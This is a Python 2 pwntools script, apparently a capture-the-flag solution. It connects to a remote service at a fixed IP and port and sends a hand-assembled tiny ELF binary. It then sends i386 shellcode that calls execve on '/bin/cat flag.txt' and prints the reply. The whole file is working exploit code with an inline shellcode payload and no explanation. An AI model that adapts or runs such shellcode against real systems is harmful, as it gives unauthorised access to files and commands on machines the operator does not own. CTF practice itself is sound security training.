#!/usr/bin/env python2
from pwn import *
import os
r = remote('195.201.117.89', 34588)
context.arch = 'i386'

os.system('nasm -f bin -o tiny tiny.asm')
tiny = open('./tiny', 'rb').read()

print 'Size:', len(tiny)

tiny = ''.join('{:02x}'.format(ord(c)) for c in tiny)
r.sendlineafter('ELF>', tiny)

# execve('/bin/cat', ['/bin/cat', 'flag.txt', NULL], NULL);
sh = asm('''
    xor    eax,eax
    xor    ecx,ecx
    push   eax
    push   0x7478742e
    push   0x67616c66
    mov    edx, esp
    push   eax
    push   0x7461632f
    push   0x6e69622f
    mov    ebx, esp
    push   eax
    push   edx
    push   ebx
    xor    edx,edx
    mov    ecx, esp
    mov    al, 0xb
    int    0x80
''')

r.send(sh)

print r.recv()
